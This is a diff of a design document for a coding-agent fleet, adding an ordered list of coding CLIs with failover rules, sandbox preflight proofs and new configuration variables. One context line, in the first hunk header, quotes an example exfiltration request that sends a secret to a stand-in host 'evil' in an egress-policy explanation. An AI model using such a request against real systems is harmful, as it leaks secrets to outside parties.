@@ -386,12 +386,46 @@ axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
 
 ## The coding CLI in the sandbox
 
+### The fleet's ordered CLI list
+
+Which coding CLIs the fleet runs is hub configuration: `MAC_CODING_AGENTS` on the
+hub, an ordered comma list (known CLIs: `opencode`, `claude`; default
+`opencode`). Workers inherit it. The hub projects its list, and its
+`MAC_CLAUDE_MODEL` and `MAC_JUDGE_MODEL` when set, into every assignment as
+`metadata.runtime.coding_policy` (a task cannot carry its own), and returns the
+same document as `coding_policy` on every heartbeat. A worker reads its own
+`MAC_CODING_AGENTS` only if the hub has issued none, and reports that as a local
+override.
+
+For each task the executor runs the first CLI on the list that works on that
+host, and moves to the next only on a structured route failure:
+
+| Failure class | When | Detected by |
+| --- | --- | --- |
+| `agent_binary_missing` | the CLI is not on the execution PATH | detector, before the run |
+| `not_configured` | no hub URL to route through | detector, before the run |
+| `inference_token_unavailable` | no worker or inference token | detector, before the run |
+| `preflight_failed` | the in-sandbox preflight did not echo the sentinel | preflight, before the run |
+| `route_auth_failed` | the run failed and the hub router's last call on that CLI's route got 401/403 | the task's `llm.route` records |
+| `route_rate_limited` | the same, with 429 | the task's `llm.route` records |
+| `route_upstream_unavailable` | the same, with a 5xx or an unreachable upstream (502) | the task's `llm.route` records |
+
+The route records are the hub router's own per-request `llm.route` entries
+(`/v1/chat/completions` for opencode, `/v1/messages` for Claude Code); no
+transcript is read. A failing test, a judge's `not_met` or a bad diff is the
+task's outcome and never moves the list. Each CLI runs at most once per attempt,
+and the next one continues in the same workspace. The task board shows each skip
+and failover as a hub `status` message, and the evidence manifest records the
+order and every run under `coding_agents`.
+
+Inside one route, provider failover is the hub router's job, across the providers
+in `MAC_ROUTER_PROVIDERS`.
+
 ### opencode through the hub model router
 
-MAC supports exactly one coding CLI: opencode. It gets its model from the hub's
-OpenAI-compatible router (`$MAC_HUB_URL/v1`), which fails over across the
-providers in `MAC_ROUTER_PROVIDERS`. Provider failover lives only there; the
-executor never re-runs a task on a different CLI.
+opencode gets its model from the hub's OpenAI-compatible router
+(`$MAC_HUB_URL/v1`). Claude Code uses the router's Anthropic-shaped
+`/v1/messages` with the same per-task token.
 
 The worker token never enters the sandbox: it can claim tasks and write the
 ledger. Instead, for each task:
@@ -447,11 +481,13 @@ live policy with a short-lived inference token and must echo a sentinel back,
 proving end to end that the **binary exists, the token is accepted, and egress
 to the hub router is permitted** in the sandbox.
 
-The worker runs this probe before dispatch and publishes a secret-free
-`mac.coding_clis.v2` heartbeat record with a single `opencode` entry: provider,
+The worker runs this probe for every CLI on the list before dispatch and
+publishes a secret-free `mac.coding_clis.v2` heartbeat record with one entry
+per listed CLI (and the list itself under `order`): provider,
 wire protocol, endpoint, authentication kind/source, model, route fingerprint,
 and the matching `mac.coding_agent.verification.v1` result. Repository dispatch
-to an OpenShell agent requires a fresh successful proof for that entry. A
+to an OpenShell agent requires a fresh successful proof for at least one CLI
+on the hub's list. A
 task-pinned model also requires proof for that exact model. Presence of the
 binary and a hub credential is only `configured`; it is never `verified`.
 
@@ -549,7 +585,10 @@ sandbox**:
 | Variable | Default | Meaning |
 | --- | --- | --- |
 | `MAC_PREFER_CODING_AGENT` | `1` | master switch; `0` disables the coding route and the executor fails closed |
-| `MAC_CODING_AGENT` | _(opencode)_ | `off` disables the coding route; any value other than `opencode` is ignored |
+| `MAC_CODING_AGENTS` | `opencode` | hub setting: the fleet's ordered coding-CLI list (`opencode`, `claude`), inherited by workers |
+| `MAC_CLAUDE_MODEL` | `claude-opus-4-8` | hub setting, inherited: the model Claude Code runs on |
+| `MAC_JUDGE_MODEL` | `claude-opus-4-8` | hub setting, inherited: the independent judge's model |
+| `MAC_CODING_AGENT` | _(unset)_ | deprecated; `off` still disables the coding route |
 | `MAC_CODING_AGENT_SANDBOX` | `verify` | `verify` = gate on the in-sandbox preflight; `trust` = assume the image is provisioned (skip the probe); `off` = never use a coding agent when confined |
 | `MAC_CODING_AGENT_PREFLIGHT_TIMEOUT` | `180` | seconds for the in-sandbox preflight |
 | `MAC_CODING_AGENT_PREFLIGHT_TTL_SECONDS` | `900` | successful route-proof lifetime in the executor/worker process |
